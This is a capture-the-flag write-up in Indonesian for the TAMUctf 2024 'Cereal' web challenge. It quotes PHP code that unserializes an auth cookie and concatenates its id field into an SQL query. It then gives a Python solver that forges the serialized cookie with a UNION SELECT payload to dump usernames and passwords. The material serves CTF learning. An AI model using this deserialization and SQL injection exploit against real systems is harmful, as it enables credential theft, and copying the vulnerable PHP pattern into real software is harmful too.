# Cereal Writeup - Web - tamuctf2024

Pada challenge ini terdapat kerentanan `PHP Deserialization`, dan kita bisa melakukan injeksi `SQLi` pada parameter id yang terdapat di cookie `session`, kita bisa memanfaatkan kerentanan tersebut untuk mendapatkan flag yang tersimpan di Database.

## Source Code
### Profile.php
```php
<?php
require_once('config.php');

// Check if logged in
if (!isset($_COOKIE['auth']) || empty($_COOKIE['auth'])) {
	header('Location: logout.php');
	exit;
}

$cookie = unserialize(base64_decode($_COOKIE['auth']));
$row = $cookie->sendProfile();

$username = $row[0];
$email = $row[1];
$cereal = $row[2];
$date = date('Y-m-d H:i:s', $row[3]);

?>
```

terlihat pada kode diatas, cookie di unserialize dan dikirimkan ke fungsi `sendProfile()`

### config.php
```php
<?php
class User {
  public $username = '';
	public $id = -1;
	
	protected $password = '';
	protected $profile;

	public function setPassword($pass) {
		$this->password = $pass;
	}

	public function sendProfile() {
		return $this->profile;
	}

	public function refresh() {
		// Database connection
		$conn = new PDO('sqlite:../important.db');
		$conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
		$query = "select username, email, favorite_cereal, creation_date from users where `id` = '" . $this->id . "' AND `username` = '" . $this->username . "'";
		$stmt = $conn->prepare($query);
		$stmt->execute();
		$row = $stmt->fetch();

		$this->profile = $row;
	}

	public function validate() {
		// Database connection
		$conn = new PDO('sqlite:../important.db');
		$conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
		$query = "select * from users where `username` = :username";
		$stmt = $conn->prepare($query);
		$stmt->bindParam(':username', $this->username);
		$stmt->execute();
		$row = $stmt->fetch();

		if (md5($row['password']) !== $this->password) {
			header('Location: logout.php');
			exit;
		}
	}

	public function __wakeup() {
		$this->validate();
		$this->refresh();
    	}
}

?>
```

Dari `config.php` kita mengetahui bahwa terdapat kerentanan SQLi pada fungsi `refresh`, yang mana `id` di masukan ke Query tanpa sanitasi, ini bisa kita manfaatkan dengan mengubah `id` yang terdapat di session sebelum di `unserialize` dan di `execute`.

Langkah langkah exploitasi:
1. Buat session cookie sesuai dengan data data yang diharapkan oleh source code
2. Masukan injeksi pada parameter `id` pada session cookie

## Solver Code
```python
import httpx
import asyncio
import base64
import urllib.parse

URL = 'http://localhost:8000'

class BaseAPI():
	def __init__(self,url=URL):
		self.c = httpx.AsyncClient(base_url=url)

	def login(self, username, password):
		return self.c.post('/authenticate.php',data={'username': username, 'password': password})

	def cookieProfile(self,cookie):
		return self.c.get('/profile.php',cookies=cookie)

class User:
    def __init__(self):
        self.username = "guest"
        self.password = "5f4dcc3b5aa765d61d8327deb882cf99"
        self.id = "' union select username,password,3,email from users;-- "
        # ' union select group_concat(username),group_concat(password),3,4 from users; --
        self.profile = "nothing"

    def serialize(self):
        # Mimic PHP serialization format for each field
        serialized_str = 'O:4:"User":4:{'
        serialized_str += 's:8:"username";s:{}:"{}";'.format(len(self.username), self.username)
        serialized_str += 's:8:"password";s:{}:"{}";'.format(len(self.password), self.password)
        serialized_str += 's:2:"id";s:{}:"{}";'.format(len(self.id), self.id)
        serialized_str += 's:7:"profile";s:{}:"{}";'.format(len(self.profile), self.profile)
        serialized_str += '}'
        return serialized_str

class API(BaseAPI):
	...

def setCookies():
	user = User()
	cookies = user.serialize()
	encoded_cookies = base64.b64encode(cookies.encode()).decode()
	return encoded_cookies

async def main():
	api = API()
	cookies = {'auth': setCookies()}
	profile = await api.cookieProfile(cookies)
	print(profile.text)


if __name__ == '__main__':
	asyncio.run(main())
```

Thankyou :))
